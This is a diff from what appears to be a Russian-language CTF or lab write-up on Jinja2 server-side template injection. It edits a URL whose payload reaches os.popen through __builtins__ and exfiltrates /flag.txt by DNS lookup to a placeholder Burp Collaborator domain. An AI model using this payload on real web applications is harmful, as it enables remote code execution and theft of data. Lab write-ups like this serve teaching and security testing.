@@ -191,7 +191,7 @@ http://127.0.0.1:9001/get_user_info?name=%7b%25%20if%20self%5brequest.args.get(%
 ```
 А url:
 ```http
-http://127.0.0.1:9001/get_user_info?name=%7b%25%20if%20self%5brequest.args.get(%22in%22)%5d%5brequest.args.get(%22gl%22)%5d%5brequest.args.get('buins')%5d%5brequest.args.get('im')%5d('os').popen(%22nslookup%20%24(cat%20%2fflag.txt%20%7c%20grep%20-oP%20'(%3f%3c%3d%5c%7b).*(%3f%3d%5c%7d)').<burp-collabarator-domain>m%22)%20%25%7d%20Hello%20%7b%25%20endif%20%25%7d&age=26&description=something&in=__init__&gl=__globals__&buins=__builtins__&im=__import__
+http://127.0.0.1:9001/get_user_info?name=%7b%25%20if%20self%5brequest.args.get(%22in%22)%5d%5brequest.args.get(%22gl%22)%5d%5brequest.args.get('buins')%5d%5brequest.args.get('im')%5d('os').popen(%22nslookup%20%24(cat%20%2fflag.txt%20%7c%20grep%20-oP%20'(%3f%3c%3d%5c%7b).*(%3f%3d%5c%7d)').<burp-collabarator-domain>%22)%20%25%7d%20Hello%20%7b%25%20endif%20%25%7d&age=26&description=something&in=__init__&gl=__globals__&buins=__builtins__&im=__import__
 ```
 ![](./img/img_10.png)
 Получили содержимое флага в качестве поддомена нашего collabarator.
